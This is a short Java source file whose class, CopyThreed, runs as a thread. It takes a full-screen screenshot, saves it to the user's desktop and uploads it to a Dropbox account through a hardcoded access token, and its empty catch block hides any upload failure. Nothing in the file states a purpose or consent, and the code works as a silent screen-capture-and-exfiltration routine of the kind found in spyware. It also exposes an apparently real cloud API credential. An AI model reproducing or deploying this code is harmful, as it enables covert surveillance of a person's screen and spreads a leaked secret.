package com.company;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class CopyThreed extends Thread {
    private final static String  ACCESS_TOKEN = "u0qEwtoWYfAAAAAAAAAADFYQ74iWzPQlZ6tfs49ET58fEJKs3KIrKuhNyPKUwklb";
    public void  initialDropBox(){

    }
    public void run () {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        try {
            screenShot();
        } catch (AWTException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            InputStream in = new FileInputStream("C:/Users/user/Desktop/screenshot.png");

            FileMetadata metadata = client.files().uploadBuilder("/screenshot.png").uploadAndFinish(in);
        }catch (Exception ex){

        }

    }
public void screenShot ()throws AWTException, IOException{

    BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

    System.out.println(image.getWidth() + " & " +image.getHeight());
    ImageIO.write(image , "png", new File("C:/Users/user/Desktop/screenshot.png"));
}

}
